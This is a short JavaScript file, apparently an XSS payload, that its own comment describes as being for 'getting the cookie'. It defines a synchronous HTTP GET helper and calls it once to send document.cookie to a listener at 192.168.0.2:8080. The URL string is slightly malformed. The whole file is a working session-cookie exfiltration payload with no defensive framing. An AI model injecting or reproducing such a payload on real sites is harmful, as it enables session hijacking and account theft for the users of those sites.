//main javascript file for getting the cookie 
function httpGet(theUrl)
{

    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false); //false
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

httpGet('http://192.168.0.2:8080/[ '+document.cookie)
